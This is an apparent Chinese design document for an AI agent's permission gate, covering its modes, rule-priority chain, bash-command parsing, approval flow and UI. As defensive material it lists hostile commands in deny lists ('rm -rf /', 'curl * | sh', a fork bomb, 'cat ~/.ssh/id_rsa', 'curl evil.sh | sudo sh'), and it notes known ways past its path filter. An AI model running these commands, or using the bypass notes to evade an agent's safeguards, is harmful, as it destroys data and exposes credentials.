## 1. 要解决什么

### 1.1 现状盘点（改造基线）

| 机制 | 位置 | 现状 |
| --- | --- | --- |
| 三闸门流水线 | `agents/check_permission.py` | s03 教程版（LangChain 词典风格），已被 hooks 取代，**不再接入主循环**，仅作学习对照 |
| Hook 化权限闸门 | `agents/hooks.py` `permission_hook`（L155-L234） | bash 硬黑名单 + 软危险终端确认 + 越界写确认（**已失效**：检查的工具名 `write_file`/`edit_file` 与实际 `run_write`/`run_edit` 不符，永不命中，代码内 2026-09-18 已记录）+ MCP destructive 确认 |
| 路径沙箱 | `agents/tools.py` `safe_path()`（L289-L320） | 所有文件工具强制工作区内，越界直接 `ValueError`（**一刀切拒绝，无放行通道**） |
| 重复黑名单 | `tools.py` L339（`rm -rf /`、`sudo`、`shutdown`、`reboot`、`> /dev/`）与 `hooks.py` `DEFAULT_DENY_LIST`（6 项） | **两份内容不同步**，改一处漏一处 |
| 非交互兜底 | `hooks.py` `silent` 模式 | cron/后台自动拒绝，防 `input()` 挂死（**保留**，此设计是亮点） |

### 1.2 核心缺陷（产品化阻断项）

1. **审批交互在终端**：`permission_hook` 用 `input()` 等待。桌面端 `run_turn` 跑在工作线程、
   UI 在 Electron —— `input()` 无人应答，等于**桌面端所有软危险操作全部挂死或按默认 N 拒绝**。
2. **无权限模式**：没有「默认 / 完全访问」的概念，用户无法表达信任程度。
3. **无记忆**：每次 `rm foo.txt` 都重新确认；没有「本次会话内允许」。
4. **无规则持久化**：黑名单/危险清单硬编码在代码里，用户不可自定义。
5. **子串匹配粗糙**：`sudo` 误杀 `echo "sudo"`；`sh -c 'rm  -rf /'`（双空格）可绕过。
6. **子智能体权限仅靠提示词约束**（`subagent.py` L46-L57），非代码级门控。

## 2. 两档权限模式

### 2.1 模式定义（对齐 WorkBuddy 的两档取舍）

**为什么两档而不是三档**（Claude Code 4 档 / Codex 双维度）：本产品面向的最终用户不是
CLI 重度开发者，中间档（如 `acceptEdits`）需要解释「编辑 vs 执行」的工具分类学，
认知负担大于收益。两档 = 零信任解释成本：**默认（该问就问）/ 完全访问（别烦我）**。

| 模式 | 值 | 语义 |
| --- | --- | --- |
| 默认 | `default` | 敏感操作逐次审批；「会话内允许」可减少打断 |
| 完全访问 | `full_access` | 跳过一切审批，**但硬拒绝清单仍然拦截**（安全底线，见 §3.2） |

**两档下各类工具的行为矩阵**（判定细则见 §3）：

| 场景 | 默认模式 | 完全访问 |
| --- | --- | --- |
| 工作区内读（`run_read`/`run_glob`） | 自动 | 自动 |
| 工作区内写/编辑（`run_write`/`run_edit`） | 自动（取舍见 §3.4-R1） | 自动 |
| 额外目录（预授权+会话批准，§3.7）内读/写/编辑 | 自动（视同工作区） | 自动 |
| 额外目录**外**读/写/编辑 | 审批（敏感路径仍硬拒，见 §3.2-②） | 自动 |
| bash：安全命令白名单内 | 自动 | 自动 |
| bash：白名单外普通命令 | 审批（记忆 `cmd_head`） | 自动 |
| bash：危险模式命中（`rm ` 等） | 审批（记忆 pattern） | 自动 |
| bash / 文件操作：硬拒绝清单 | **拒绝** | **拒绝** |
| MCP 普通工具 | 自动 | 自动 |
| MCP destructive（`destructiveHint`） | 审批（记忆工具名） | 自动（设置可改为仍审批，§5.3-⑧） |
| `ask_user` / 任务 / 技能等非敏感工具 | 自动 | 自动 |

### 2.2 存储与继承链（用户需求 #2 / #4 的落点）

```
~/.aigent/config/permissions.json        ← 全局兜底 default_mode（设置中心可改）
~/.aigent/projects/projects.json  ← 每工作空间 permission_mode（最后一次更改值）
<空间元数据目录>/.chathistory/session_<id>.meta.json
                                  ← 每会话 permission_mode + session_allows
```

**继承规则**（新建会话时）：

```
会话 meta 无记录（存量会话）
    → 工作空间 projects.json 的 permission_mode
        → 工作空间无记录（新建空间/升级）
            → permissions.json 的 default_mode（缺省 "default"）
```

- **会话内切换模式**（输入区盾牌 chip，§5.2）→ `session_permission` 命令 →
  ① 更新会话 `meta.permission_mode`；② **同步更新所属工作空间** `projects.json` 的
  `permission_mode`（用户需求 #4：本项目内新建会话默认用本项目最后一次更改的权限选项）。
- **运行时**：`Agent` 实例内存持有当前模式（gate 每次判定实时读，切换即时生效）；
  `init_session` / `switch_session` 时从 meta 恢复，并同步恢复 `session_allows` 到
  `PermissionGate` 与 `ToolRegistry.approved_dirs`（§3.3）。
- **cron / 后台任务会话**：创建时按同一继承链取模式。判据是**有无审批通道
  （`ApprovalBroker` 是否注入）**，不是 `silent` —— 桌面端每会话 `Agent` 同样是
  `silent=True`（`silent` 在 Agent 层只抑制后端 stdout 打印），拿它判无人值守会把
  审批卡片全部吞掉（2026-09-22 事故，详见 §3.2-⑧）。cron / 纯后台不注入 broker →
  保持现状**自动拒绝**软危险操作；完全访问 → 放行（硬拒绝仍拦截）。

### 2.3 协议（模式读写）

| 方向 | kind | payload |
| --- | --- | --- |
| 前端 → 后端 | `session_permission` | `{session_id, mode: "default" \| "full_access"}` |
| 前端 → 后端 | `project_permission` | `{project_id, mode}`（新建任务态切目标空间档位，写 projects.json「最后更改值」，见 §5.2） |
| 后端 → 前端 | `permission_changed` | `{session_id, mode, source: "user" \| "replay", at}` |

- `sessions` 信封的条目与 `session_history` 同步携带 `permission_mode`（切会话时前端
  恢复 chip 状态；`session` 元数据字段见 §7.2）。
- `project_permission` 无会话号，成功后不回 `permission_changed`，改广播 `projects`
  —— 新建任务态的 chip 选中态由 `projects` 广播驱动。
- 切换在 turn 进行中到达：**只影响后续判定**，在途审批不取消、不改判（§8-E6）。
- 广播 `permission_changed` 让前端所有视图（chip / 卡片副标题）一致。

## 3. 规则引擎（`agents/permission.py` 新模块）

### 3.1 模块定位

新模块 `agents/permission.py`，两个职责类：

- **`PermissionGate`** —— 纯判定（无 IO 阻塞）：输入 `(tool_name, args, mode, session_allows, store)`，
  输出 `Decision`（见下）。每个 `Agent` 实例持有一个（同 `HookSystem` 的实例化模式）。
- **`PermissionStore`** —— `~/.aigent/config/permissions.json` 的唯一读写门面（结构化配置，
  参照 `llmconfig.json` 先例：`config.py` 的 `load()` 只合并扁平字符串键进 `os.environ`，
  **不支持列表/嵌套**，故规则文件独立成篇）。判定时缓存 + mtime 检查热加载
  （同 `MCPManager` 每轮热加载风格），设置中心保存后即刻生效。

`Decision` 判定结果（数据类）：

```python
@dataclass
class Decision:
    action: str      # "allow" | "deny" | "approve"
    reason: str      # 展示给用户的原因 / 回填模型的拒绝文案
    trigger: str     # 审批触发类型（approve 时必填）：
                     #   "dangerous_pattern" | "bash_not_allowed"
                     #   | "outside_workspace" | "mcp_destructive" | "custom_rule"
    session_key: dict | None   # 「会话内允许」的记账粒度（approve 时必填），如
                     #   {"type": "bash_prefix", "value": "git push"}
                     #   {"type": "path",       "value": "/Users/x/Downloads"}
                     #   {"type": "mcp_tool",   "value": "mcp__x__send_message"}
                     #   {"type": "pattern",    "value": "rm "}
```

`hooks.py` 的 `permission_hook` **保留为唯一挂点**（PreToolUse 事件契约不变），但主体
逻辑全部委托给 `PermissionGate`；`DEFAULT_DENY_LIST` / `DEFAULT_DESTRUCTIVE` 从 hooks.py
**迁到 permission.py 单一出处**，`tools.py` L339 的重复黑名单删除（修复两份不同步）。

### 3.2 判定优先级链（八步制式，顺序即语义；第⑤步已于 2026-09-22 下线）

> **2026-09-22 补充修正（两处）**：① 敏感路径检查由原第⑥步**上移并入②**——原稿
> 「E8 声称敏感路径任何模式拦截、链条却排在完全访问之后」自相矛盾；「完全访问 =
> 跳过审批」的语义不该顺带解锁「读出 API 密钥」（对齐 Claude Code：deny 规则在
> bypassPermissions 下仍生效）。② 新增第④步**预授权目录**（用户补充需求：允许操作
> 工作目录之外的文件和目录，见 §3.7）。

```
① 解析失败        工具参数 JSON 解析异常 / 结构不符 → deny（fail-closed，宁拒不放）
② 硬拒绝          a) 内置 DENY + permissions.json 的 deny_patterns
                     （原 `rules[action=deny]` 已随自定义规则下线迁入此处，2026-09-22）
                  b) 敏感路径 DENY_PATHS（§3.3）：文件工具的目标路径，或 bash 命令
                     归一化后段中出现的裸路径 token（防 `cat ~/.ssh/id_rsa` 绕道）
                  → deny。**任何模式（含完全访问）、任何记忆（含会话内允许/额外目录）
                  都不可越过**
③ 完全访问        mode == "full_access" → allow（§5.3-⑧ 的 mcp_destructive=ask 例外）
④ 预授权目录      文件工具目标在「额外目录集」（§3.7：全局 + 空间 + 会话批准）内
                  → allow（bash 不走此步——命令语义由⑦的命令链判定）
⑤ 自定义允许规则  **已下线（2026-09-22）** —— 见下方「次序修正」块。编号保留不重排，
                  便于与既有记录对照
⑥ 会话内允许      session_allows 匹配（含 path 类型的批准目录）→ allow
⑦ 类别规则        按 §2.1 矩阵分派 → allow 或 approve。**bash 分支内部次序已修正**：
                  ⑦-1 危险模式 → ⑦-2 安全白名单 → ⑦-3 白名单外兜底（先危险后白名单）
⑧ 审批            有通道 → 走 ApprovalBroker（§4）阻塞等三选一；CLI（无 broker、
                  silent=False）→ 终端 `input()` 三选一；**无通道且 silent**
                  （cron / 纯后台）→ 自动拒绝 `Permission denied (non-interactive
                  session)`。判据是**通道是否存在**，不是 `silent` —— 桌面端 Agent
                  亦为 silent=True，按 silent 短路会让前端审批卡片永不弹出
                  （2026-09-22 事故：一切待审批操作被静默拒绝，用户表现为
                  "无法删除文件、rm 被硬拦"）
```

> **2026-09-22 次序修正（本轮实质改动）**：⑦ 的 bash 分支原先**白名单在前**，
> 命中即 `continue` 跳过本段剩余检查 —— 由同一个原因同时产生一个安全洞与一个能力缺口：
>
> - **安全洞**：`cat x > /etc/passwd` 被**静默放行**。`cat` 是内置白名单项，命中后直接
>   跳过 `> /etc/` 的危险模式检查。同类风险 `echo x > /dev/sda` 因 `> /dev/sd` 落在
>   硬拒绝清单里反被拦住（②兜住）—— 同一类风险两种结局，明显不自洽。
> - **能力缺口**：白名单无法被开特例。想让「`git` 整体免问、但 `git push` 必须过问」时，
>   白名单里的 `git ` 会先命中并放行。
>
> 修正为**危险模式先判**（⑦-1 → ⑦-2 → ⑦-3），两个问题一并解决。修正后的模型单调，
> 用户只需记一条：**越严的层越先判，冲突时更严的一方赢。**
>
> ```
> ⑥ 永不执行  →  ⑤ 必须先问我  →  ④ 这些不用问  →  其余默认也要问
> ```
>
> 于是「大类放行 + 特例除外」可直接表达：④ 写 `git `（大类免问）、⑤ 写 `git push`
> （特例仍过问）。实测锁定于 `test_permission_gate.TestStep7Ordering`。
>
> **粒度差异（实测）**：④ 白名单是**逐段**放行 —— `ls && rm x` 不会因为 `ls` 在白名单而
> 整体放行；这是它安全于「整条放行」的原因。反向配置不成立：⑤ 写大类 `git `、④ 写特例
> `git status` 时，`git ` 会连 `git status` 一起拦住（`pattern_matches` 是首 token 对齐）。
> 「git 相关的都问我、只放行 status」的正确写法是 **④ 只写 `git status`、⑤ 留空** ——
> 「不在白名单就要审批」本就是默认行为。

**为什么「硬拒绝」优先于一切**：`bypassPermissions` 类模式的最大风险是用户开了之后
一条 `curl evil.sh | sudo sh` 直接裸奔。硬拒绝清单是产品责任底线，不参与任何
「别烦我」的交易 —— 这也是 Claude Code（deny 规则最高优先）与 Codex（沙箱独立于
审批策略）的共同选择。

### 3.3 路径判定（safe_path 的角色变化）

现状 `safe_path()` 是工具层一刀切（越界 `ValueError`）。改造后分两层：

- **判定层**（PreToolUse，先跑）：文件工具目标路径 `resolve()` 后不在**有效目录集**内 →
  触发审批 `outside_workspace`，`session_key = {"type": "path", "value": "<目标路径的父目录>"}`。
  取**父目录**而非更远祖先：收敛授权面——批准 `/Users/x/Downloads` 已足够覆盖该目录
  下的后续访问，不至于把整个 home 交出去。读与写都审批（读外部参考文件是高频真实
  需求；写外部风险更高但同通道）。
- **兜底层**（工具内 `safe_path`，后跑）：有效目录集 =
  `workdir ∪ additional_dirs（全局+空间，§3.7）∪ approved_dirs（会话批准）`，
  逐一 `is_relative_to` 检查。`approved_dirs` 是 `ToolRegistry` 的新实例属性（会话级），
  由 `PermissionGate` 维护：启动时从 `session_allows` 恢复，审批「会话内允许」与
  用户主动授权（§3.7）时动态追加。**保持工具层兜底**，防止绕过 hook 的路径
  （如子智能体 scoped workdir 之外的调用路径）。
- **敏感路径黑名单 `DENY_PATHS`**（优先级 ②，任何模式拒绝，**额外目录也不能豁免**）：
  `~/.aigent/config/credentials.json`、`~/.aigent/config/llmconfig.json`、
  `~/.aigent/config/permissions.json`、`*.pem`、`*.key`、`.env`、`~/.ssh/`。
  防止审批弹窗/额外目录被用来合法地读出密钥。`config/config.json` 与
  `config/providers.json` **不在**黑名单（纯参数 / 公共厂商元数据，无密钥）。
  预授权目录与 DENY_PATHS 相交时，相交部分**从有效目录集中剔除**（deny 恒赢）。
  > 2026-09-22 配置文件收口到 `~/.aigent/config/` 后，**迁移前的顶层旧路径
  > （`~/.aigent/credentials.json` 等三份）仍在黑名单内**：搬迁失败或用户手工
  > 同步回一份副本时，不会出现"新路径已生效、旧文件却成了可读后门"。
  > `~/.aigent/logs/` 于 2026-09-22 移出黑名单：日志不含密钥，且"读自己的日志排障"
  > 是 agent 刚需（此前 `run_read` 读 `agent_日期.log` 会被硬拒）。写入不收窄——
  > logs 不在工作空间内，`run_write`/`run_edit` 照常走 ⑦ 的 `outside_workspace` 审批。
- **bash 的路径扫描**（②b）：bash 命令不受 `safe_path` 约束（命令级判定），但归一化
  后扫描段中的**裸路径 token**（`/`、`~/` 开头），命中 DENY_PATHS → 硬拒绝。
  局限如实声明：变量拼接（`cat $HOME/.ssh/id_rsa`）、`cd` 后的相对路径可绕过 token
  扫描——这是纵深防御而非绝对墙，绝对墙只有系统级沙箱（见文末主流对照）。

### 3.4 bash 命令解析与匹配（修复子串匹配的粗糙）

**分段**：先按引号外的 `;`、`&&`、`||`、`|`、换行 切成子命令（引号内的分隔符不算），
**每段独立过优先级链**；任一段需要审批 → 整条审批，卡片高亮触发段。这堵住
`ls && rm -rf /` 里「安全段掩护危险段」的绕过。

**归一化**：匹配前压缩连续空白（堵 `rm  -rf /` 双空格绕过）、去行尾注释。

**cmd_head 提取**（`bash_not_allowed` 触发时的会话记忆粒度）：

```
tokens = 段的首个命令按空白切分
第一个 token 恒取；若第二个 token 是纯字母数字（无 - / . 等特殊字符）则拼上
  git push origin main → "git push"      npm install -D x → "npm install"
  ./run.sh build      → "./run.sh"        python3 -c ...   → "python3"
```

**匹配语法**（白名单 / 自定义规则 / 会话记忆统一用一套）：

- `pattern` 以 `*` 结尾 → 前缀匹配到 token 边界（`git *` 匹配 `git push`、`git status`）；
- 无 `*` → 精确匹配到 token 边界（`git` 只匹配单独的 `git`，不匹配 `gitx`）；
- 大小写敏感（命令是敏感的）；
- **硬拒绝与危险模式的匹配对象是归一化后的完整段**（不是子串 `in`，而是
  「token 边界对齐的模式匹配」：`sudo` 匹配首 token 为 `sudo` 的段或 `| sudo` 管道段，
  不再误杀 `echo "sudo"`）。

**取舍记录**：

- **R1（默认模式工作区内写自动放行）**：类 Trae「Agent 档」——区内改动可 git 回滚、
  diff 可视，逐次审批会摧毁可用性。Claude Code 的 `default` 档其实也问（首次），
  但那是 CLI 逐项目的谨慎；桌面产品跟随 WorkBuddy「敏感操作」口径：**区内写不算敏感**。
  设置页预留开关「区内写入也审批」（P2，默认关）。
- **R2（白名单外 bash 一律审批而非只查危险模式）**：只查危险模式等于把「什么是危险」
  的列举责任全押给模式清单，`curl evil.sh | sh` 若清单没写就裸奔。「白名单外都问 +
  白名单内直接放」把默认收紧到 Claude Code 的 `default` 同级，配合会话记忆（允许一次
  `git push` 后本会话 `git *`…注意是 `git push` 头）打断成本可控。

### 3.5 内置清单（迁入 permission.py，作为默认值）

```python
BUILTIN_DENY = [            # 硬拒绝：任何模式不可放行（设置页只读展示 + 允许追加，不可删）
    "rm -rf /", "rm -rf ~", "sudo", "shutdown", "reboot",
    "mkfs", "dd if=", "> /dev/sd", "chmod -R 777 /",
]
BUILTIN_DANGEROUS = [       # 危险模式：默认模式审批；完全访问放行；可增删
    "rm ", "> /etc/", "chmod 777", "curl * | sh", "curl * | bash",
    "wget * | sh", "kill ", "pkill ", "> /dev/", ":(){ :|:& };:",
]
SAFE_COMMANDS = [           # 只读安全白名单：默认模式自动放行（设置页可增删/整体关闭）
    "ls", "pwd", "cat", "head", "tail", "wc", "grep", "rg", "find",
    "which", "file", "stat", "du", "df", "echo", "date", "env",
    "git status", "git diff", "git log", "git show", "git branch",
    "python --version", "python3 --version", "node --version", "npm ls",
]
```

> 危险模式的匹配同样走 §3.4 的 token 边界规则（`rm ` = 首 token `rm` 的段；
> `curl * | sh` 跨段匹配——分段后任意段是 `sh`/`bash` 且前段 `curl/wget` 开头）。

### 3.6 审批触发展示（reason 文案）

| trigger | 卡片副标题 |
| --- | --- |
| `dangerous_pattern` | `危险命令模式：<pattern>` |
| `bash_not_allowed` | `未在安全命令白名单内`（附已记忆提示：本次会话已允许 `<cmd_head>` 开头的命令将直接放行） |
| `outside_workspace` | `工作空间与额外目录外路径：<绝对路径>` |
| `mcp_destructive` | `MCP 破坏性工具（destructiveHint）` |
| `custom_rule` | `命中自定义规则：<pattern>` |

### 3.7 额外目录（additional directories，三级授权）

> **2026-09-22 用户补充需求**：允许智能体操作工作目录之外的文件和目录——主流智能体
> 均有此能力（Claude Code `additionalDirectories` / 会话内 `/add-dir`；Codex 沙箱的
> `writable_roots`）。本节把「工作区外」从**只能被动审批**升级为**可主动预授权**。

**三级授权模型**（有效目录集 = 三级并集，剔除 DENY_PATHS 相交部分后生效）：

| 级别 | 存储 | 生效范围 | 授权入口 |
| --- | --- | --- | --- |
| ① 全局额外目录 | `permissions.json` 的 `additional_dirs[]` | 所有工作空间的所有会话 | 设置中心 → 权限管理 → ③ 额外目录（§5.3） |
| ② 空间额外目录（P2） | `projects.json` 条目的 `additional_dirs[]` | 该工作空间的所有会话 | 工作空间管理（11 篇增量：空间右键/空间设置） |
| ③ 会话批准目录 | 会话 meta 的 `session_allows`（`type=path`） | 仅本会话 | 两个入口：a) 审批弹窗「本次会话内允许」（§3.3，记**父目录**）；b) **用户主动授权**（下段） |

**用户主动授权（不等待模型触发）**：输入区**目录 chip**（盾牌 chip 旁）→「添加目录…」→
Electron 原生目录选择框（路径来源同 `project_add`）→ `session_dir_grant` 命令 →
写入 `session_allows`（`source: "user"`）并即时生效（`approved_dirs` 追加）。
chip 常显本会话已授权目录数（含审批产生的），点开列表可逐项**撤销**
（`session_dir_revoke`：从 meta 与 `approved_dirs` 同步移除，后续判定按新集生效，
语义同 E6——只影响后续判定，不重判在途审批）。

**与 bash 的关系**：额外目录只作用于**文件工具**的路径判定；bash 命令里的路径不受
`safe_path` 约束（命令本身走 §3.4 判定 + §3.2-②b 敏感路径扫描）——与 Claude Code
「Read/Edit 有路径权限、Bash 按命令审批」是同一不对称，理由：shell 命令的路径语义
无法可靠静态穷举。

**持久化与恢复**：③随会话 meta 持久（「会话内」以会话为界，重启/切回会话恢复生效）；
①保存即热加载（同 rules）；②随空间元数据读取（P2）。

## 4. 审批流（`agents/approval.py` 新模块）

### 4.1 线程模型（克隆 `interaction.py`，逐条对照）

`ApprovalBroker` 与 `InteractionBroker` 同构，差异只在载荷与结算文案：

| 关注点 | 设计 |
| --- | --- |
| 阻塞点 | `permission_hook` 内（PreToolUse，turn 工作线程）——与 `run_ask_user` 阻塞在 handler 是**同一线程模型**（`asyncio.to_thread` 派发，阻塞工作线程不卡事件循环） |
| 等待循环 | `pending.done.wait(0.2s)` 轮询 `stop_event` 兜底 + 超时检查；**等待期绝不持锁** |
| 唤醒 | `resolve()/cancel()/cancel_all()` 锁内改状态、**锁外** `done.set()` + 广播 |
| 独占性 | 同会话至多一个在途审批（串行桶天然排队：agent_loop 顺序执行工具） |
| 无 broker 回调 | ① CLI（终端可用）→ 回落 `input()` 三选一交互（保留现有终端体验）；② **无通道且 silent**（cron/后台无人值守）→ **默认模式自动拒绝**、完全访问放行。判据是**通道有无**，不是 `silent` 本身（桌面端 Agent 亦 silent=True，见 §3.2-⑧） |

### 4.2 信封协议

| 方向 | kind | payload |
| --- | --- | --- |
| 后端 → 前端 | `approval_request` | `{session_id, request_id, tool_call_id, tool_name, args, trigger, reason, session_scope_hint, mode, timeout_seconds, created_at, subagent_id?, subagent_name?}` |
| 前端 → 后端 | `approval_answer` | `{session_id, request_id, decision: "allow_once" \| "allow_session" \| "deny"}` |
| 后端 → 前端 | `approval_resolved` | `{session_id, request_id, tool_call_id, status, decision?, at}` |

- `status`：`allowed_once` / `allowed_session` / `denied` / `timeout` / `stopped`
  （`stopped` = 停止按钮 / 会话销毁结算，与 ask 同语义）。
- `session_scope_hint`：**会话内允许的预览文案**（如「将允许 `git push` 开头的命令，直到会话结束」
  /「将允许访问 `/Users/x/Downloads`，直到会话结束」）—— 前端原样显示在「本次会话内允许」
  按钮副文案里，用户**点之前就知道记的是什么账**。
- 迟到/重复作答：幂等丢弃（同 ask 的 `announced`/request_id 机制），前端重复点击无副作用。
- **重连重放**：`ws_bridge` 新增 `_approval_snapshot_lines()`（对照 `_ask_snapshot_lines`），
  连接建立时重发在途 `approval_request`；前端按 `request_id` 幂等恢复卡片。

### 4.3 结算回填（给模型的固定文案）

审批决定**不进模型上下文**（范式 C），但工具的**结局**必须让模型知道（它要继续干活）：

| 结局 | 回填给模型的 tool_result |
| --- | --- |
| 允许（一次/会话） | 正常工具执行结果 |
| 拒绝 | `Error: Permission denied by user` |
| 超时 | `Error: Permission denied (approval timeout)` |
| 被停止 | 沿用现有 stop 语义（本轮终止） |

### 4.4 落盘（回放通道）

审批卡片在消息流里展示，但**决定本身不进对话历史**——落盘走 UI 元数据旁挂：

- **tool 行附加 `approval` 字段**（与 assistant 行挂 `usage`/`model_info` 同模式）：

```jsonc
// session_N.jsonl 中 role=tool 行
{"role": "tool", "content": "Error: Permission denied by user",
 "tool_call_id": "call_x1", "approval": {
   "decision": "denied",            // allowed_once | allowed_session | denied | timeout
   "trigger": "dangerous_pattern",  // 触发类型（§3.6）
   "pattern": "rm ",                // 触发模式/路径/工具名（按 trigger 取义）
   "mode": "default",               // 当时会话模式
   "at": "2026-09-22T14:30:00"
 }}
```

- **天然不进模型上下文**：`load_session_history` 对 `role=tool` 行只保留
  `role/content/tool_call_id` 三字段进消息（L376-L381），`approval` 与 `usage`/
  `model_info` 一样是「展示元数据」——零投影改动。
- **回放**：前端 `historyToMessage` 把 `approval` 挂到对应工具折叠条，渲染
  「已拒绝（危险命令）」徽标；无字段 = 旧会话，按现有逻辑正常渲染。
- 允许执行的工具行**不写** `approval`（减少落盘噪音；卡片展开态回放即普通工具条）。

### 4.5 超时

- 默认 **300s**（`permissions.json` 可配 60–3600）。到期 broker 自结算 `timeout`
  → 自动拒绝 → 回填超时文案 → 广播 `approval_resolved`。
- 前端卡片显示倒计时（最后 60s 变红）。选择超时而非无限等待：审批挂起期间 turn
  无法推进，用户离开时应有确定性结局（同 cron 自动拒绝的哲学）。

## 5. 前端交互

### 5.1 审批卡片（消息流内，锚定 tool_call 折叠条）

**位置取舍**：不做成 `AskUserPanel` 那样的输入区上方面板。理由：① 审批对象是
**工具调用**，卡片贴在 `tool_call` 折叠条上（`tool_call_id` 天然锚点，同 ask_user 的
锚点方案），用户看着命令做裁决，视线不用跳；② 审批可能高频出现，整块让位太重；
③ **停止按钮在输入区**——审批挂起时必须仍可停止（ask 面板让位期间停止不可见的
副作用在本场景不可接受）。

**卡片状态机**（主智能体工具条；子智能体工具行同理，`subagent_id` 路由）：

```
tool_call（聚合完毕，闭合折叠条）
   └→ approval_request 到达（tool_call_id 配对）
        → 折叠条置「等待审批」态：展开、命令 mono 展示、触发原因 chip、三按钮、倒计时
             ├→ approval_resolved: allowed_* → 折叠条恢复「执行中→完成」（正常流）
             ├→ approval_resolved: denied/timeout → 折叠条红色「已拒绝」态 + 原因
             └→ 超时前用户点停止 → turn 终止，卡片置灰「已停止」
```

**卡片内容**（自上而下）：

| 部分 | 内容 |
| --- | --- |
| 标题行 | 盾牌图标 + `权限确认` + 触发原因 chip（§3.6 文案） |
| 命令区 | 完整命令/参数（`white-space: pre-wrap`，mono 字体，触发段高亮底色；额外目录外路径场景显示解析后的绝对路径） |
| scope 提示 | `session_scope_hint`（「本次会话内允许」按钮的副文案，用户点前知道记什么账） |
| 按钮区 | **允许一次**（主按钮）/ **本次会话内允许** / **拒绝** |
| 倒计时 | `mm:ss`，最后 60s 红色；超时自动置「已拒绝（超时）」 |

**输入区行为**：审批在途（`approvalBySession[activeSession]` 非空）时
**发送按钮禁用**（title：`等待权限审批`），输入框可打字（草稿不丢）、**停止可用**。
与 `.chat--asking`（ask 整块让位）刻意不同，理由见上。

### 5.2 模式开关（输入区盾牌 chip）

- 位置：输入区工具栏（模型选择器、工作空间 chip 旁）。
- 形态：盾牌图标 + 当前模式短文案（`默认` / `完全访问`）。`full_access` 态用琥珀色，
  hover 提示「完全访问：跳过权限审批（硬拒绝仍生效）」。
- 交互：点击弹小菜单（两项 + 一句说明）；选中 → 发 `session_permission` →
  收 `permission_changed` 更新 chip（**以后端广播为准**，不做乐观更新——与 ask 面板
  「等 resolved 再关」同一教训：传输层丢失时乐观 UI 会说谎）。
- **新建任务（无会话）态同样可点**（2026-09-22 联调修正，原设计为只读）：菜单选中 →
  发 `project_permission{project_id, mode}` → 后端写 projects.json「最后更改值」并广播
  `projects` → chip 按 `projects` 广播更新（同样不乐观更新）。写入的是**目标空间**
  （「+」/chip 选定的 `pendingProjectId`，缺省跟随后端活动空间）的档位，作为该空间
  **新会话**的默认值；已有会话不受影响。两个入口最终都收敛到空间「最后更改值」，
  保证「先调档位再发首条消息」的会话继承到刚选的档位。
- 新建会话（惰性领号）后 chip 按 `permission_changed{source:"replay"}` 初始化。
- **目录 chip（§3.7）**：盾牌 chip 旁。常显「N 个额外目录」（全局+会话批准数）；
  点击展开：已授权目录列表（来源区分「审批产生 / 手动添加」，可撤销）+
  「添加目录…」（原生目录选择框 → `session_dir_grant`）。用户**不等模型触发**就能
  预授权常用目录——与 Claude Code `/add-dir` 对齐。

### 5.3 设置中心：权限管理页（用户需求 #5）

> **开发方案见 `18-权限管理设置页开发方案.md`**（2026-09-22 补）。本节只定**设计**
> （分区与语义）；命令契约、生效语义矩阵、归一化告警、组件落点、任务拆分与验收标准
> 在 18 篇。两者冲突时以本篇设计为准，18 篇同步。

`SettingsModal.tsx` 的 `NAV` 增加菜单项（`通用 / 模型 / 权限 / 归档 / 关于`，
`SettingsTab` 类型加 `'permission'`），新组件 `Settings/PermissionSettings.tsx`，
单页滚动布局（非 master-detail）：

| 分区 | 内容 | 存储 |
| --- | --- | --- |
| ① 权限模式 | 新建会话的兜底模式（说明继承链：会话 ← 工作空间最后更改 ← 此处） | `default_mode` |
| ② 审批行为 | 审批超时（60–3600s，默认 300） | `approval_timeout_seconds` |
| ③ 额外目录 | **全局预授权目录列表**（原生路径选择器 + 增删 + 说明文案：文件工具在这些目录内读写视同工作区，敏感路径仍拦截；空间级目录为 P2，入口在工作空间管理） | `additional_dirs[]` |

| ⑥ 硬拒绝 | 内置只读展示 + 自定义追加 + 红色警示「最先判定：任何模式下均直接拒绝，不可被审批/白名单/额外目录放行」 | `deny_patterns` |

> **2026-09-22 二次改造（七分区 → 七分区）**：原「⑦ 自定义规则」**已下线**。它的三种动作
> 与三个分类区一一对应（拒绝→⑥、询问→⑤、允许→④），单独成区等于给同一语义两个写入口，

> **「判定顺序」区块**，数据来自后端 `builtin.order`，把内部次序直接摊给用户看 ——

## 8. 边界与竞态（13 条）

1. **E1 超时**：到点 broker 自结算 `timeout` → 拒绝回填 + 广播；前端倒计时与后端时钟独立，以后端 `approval_resolved` 为准（前端倒计时仅展示）。
2. **E2 停止**：stop → `cancel_all()` → `stopped` 结算，工具不执行，turn 按现有 stop 语义终止。
3. **E3 断线重连**：`_approval_snapshot_lines()` 重放在途请求；前端按 `request_id` 幂等（重放不重建已渲染卡片）。
4. **E4 迟到作答**：结算后再收 `approval_answer` → 幂等丢弃（同 ask）。
5. **E5 会话销毁/切换**：销毁 → cancel 结算；切换**不**结算（其他会话的审批与本会话 UI 无关，后台会话审批仍在途，切回去卡片还在——`approvalBySession` 按 session 路由，同 `interactionBySession`）。
6. **E6 模式切换 vs 在途审批**：切换不取消、不改判在途审批（按触发时刻的模式判定已经发生）；只影响后续 gate 判定。
7. **E7 `allow_session` 写 meta 失败**：内存先生效 + 日志告警（降级：本进程内仍允许；重启后丢记忆可接受）。
8. **E8 完全访问 ≠ 无底线**：硬拒绝与敏感路径（②，2026-09-22 修正：已并入同一优先级）在任何模式下拦截，**额外目录也不能豁免**；`mcp_destructive=ask` 时完全访问下 MCP 破坏性工具仍审批（设置语义，§5.3-⑧）。
9. **E9 批内多工具**：agent_loop 串行执行 → 审批逐个弹出（同 ask 独占串行）；后台桶并行的子智能体审批互不阻塞（各自线程各自阻塞，卡片按 `subagent_id` 区分）。
10. **E10 双写一致性**：`session_permission` 同时写会话 meta 与 `projects.json`，后者失败仅日志（继承源退回旧值，无数据损坏）。
11. **E11 permissions.json 热加载**：判定线程读缓存（mtime 检查），保存命令写盘 + 失效缓存；读写各持锁，无并发撕裂。
12. **E12 旧会话/旧数据**：meta 无 `permission_mode` → 继承链兜底；tool 行无 `approval` → 正常渲染；`check_permission.py` 教程文件不删不动（学习对照）。
13. **E13 目录授权/撤销的即时性**：`session_dir_grant/revoke` 与设置页保存 `additional_dirs` 均只影响**后续**判定（同 E6 模式切换语义）；在途审批不重判。撤销会话批准目录后，`approved_dirs` 与 `safe_path` 兜底层同步收紧；已执行的读写不回滚（授权是前瞻性的，不追责历史）。

### 2. 实施中揪出的契约偏差（已修，测试守护）

